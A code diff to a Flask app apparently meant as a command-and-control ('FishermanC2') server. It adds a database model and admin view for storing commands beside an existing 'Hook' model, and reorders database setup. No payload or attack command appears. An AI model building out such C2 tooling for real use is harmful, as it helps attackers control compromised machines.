@@ -1,13 +1,12 @@
-from flask import Flask, jsonify
+from flask import Flask, jsonify, render_template
 from flask_jwt_extended import create_access_token
 from flask_admin import Admin
-from app.views.admin import MyAdminIndexView, HookModelView
+from app.views.admin import MyAdminIndexView, HookModelView, CommandView
 from flask_sqlalchemy import SQLAlchemy
 import flask_login as login
 from datetime import datetime
 import dotenv
 
-dotenv.load_dotenv()
 
 app = Flask(__name__)
 app.config.from_pyfile("config.py")
@@ -18,8 +17,12 @@ admin = Admin(app, name="Fisherman's Boat", template_mode='bootstrap3', index_vi
 db = SQLAlchemy()
 db.init_app(app)
 
-with app.app_context():
-    db.create_all()
+class Command(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    command = db.Column(db.String(256), nullable=False)
+
+    def __repr__(self):
+        return f'<Command {self.command}>'
 
 class Hook(db.Model):
     id = db.Column(db.Integer, primary_key=True, autoincrement=True)
@@ -27,6 +30,7 @@ class Hook(db.Model):
 
     def __repr__(self):
         return f'<Hook {self.id}>'
+    
 
 class Admin(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -52,8 +56,11 @@ class Admin(db.Model):
     def __unicode__(self):
         return self.username
 
+with app.app_context():
+    db.create_all()
 
 admin.add_view(HookModelView(Hook, db.session))
+admin.add_view(CommandView(Command, db.session))
 
 login_manager = login.LoginManager()
 login_manager.init_app(app)
@@ -65,7 +72,7 @@ def load_user(user_id):
 
 @app.route('/')
 def index():
-    return '<h1>FishermanC2</h1>'
+    return render_template('index.html')
 
 
 @app.route('/hook')
